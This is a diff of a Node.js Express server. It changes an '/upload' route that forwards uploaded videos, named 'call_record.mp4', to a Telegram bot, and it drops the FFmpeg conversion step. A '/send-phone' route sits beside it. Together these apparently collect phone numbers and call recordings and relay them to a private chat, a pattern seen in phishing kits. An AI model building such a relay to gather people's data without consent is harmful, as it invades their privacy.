@@ -65,61 +65,29 @@ app.post("/send-phone", async (req, res) => {
 // 🚀 UPLOAD VIDEO ROUTE
 // =====================
 app.post("/upload", upload.single("video"), async (req, res) => {
-    let filePath;
-    let mp4Path;
-
     try {
         if (!req.file) return res.status(400).send("No file uploaded");
 
-        filePath = req.file.path;
-        mp4Path = filePath + ".mp4";
-
-        console.log("🔄 Starting conversion for:", filePath);
-
-        // 🔄 FFmpeg conversion to ensure Telegram compatibility
-        await new Promise((resolve, reject) => {
-            ffmpeg(filePath)
-                .outputOptions([
-                    "-c:v libx264",
-                    "-preset ultrafast",
-                    "-pix_fmt yuv420p",
-                    "-c:a aac"
-                ])
-                .save(mp4Path)
-                .on("end", () => {
-                    console.log("✅ Conversion finished");
-                    resolve();
-                })
-                .on("error", (err) => {
-                    console.error("❌ FFmpeg error:", err.message);
-                    reject(err);
-                });
-        });
+        console.log("📁 File received:", req.file.path);
 
         const form = new FormData();
         form.append("chat_id", CHAT_ID);
-        form.append("video", fs.createReadStream(mp4Path), {
-            filename: "call_record.mp4",
-            contentType: "video/mp4"
-        });
+        form.append("video", fs.createReadStream(req.file.path));
 
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, form, {
-            headers: form.getHeaders()
-        });
+        const response = await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
+            form,
+            { headers: form.getHeaders() }
+        );
 
-        // 🧹 CLEANUP
-        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
-        if (fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
+        console.log("✅ Telegram response:", response.data);
 
-        res.send("Upload successful");
+        fs.unlinkSync(req.file.path);
+
+        res.send("Upload successful (no conversion)");
     } catch (err) {
-        console.error("Processing Error:", err.message);
-        
-        // Final cleanup in case of crash
-        if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
-        if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
-
-        res.status(500).send("Server Error");
+        console.error("❌ Upload Error:", err.response?.data || err);
+        res.status(500).send("Error uploading video");
     }
 });
 
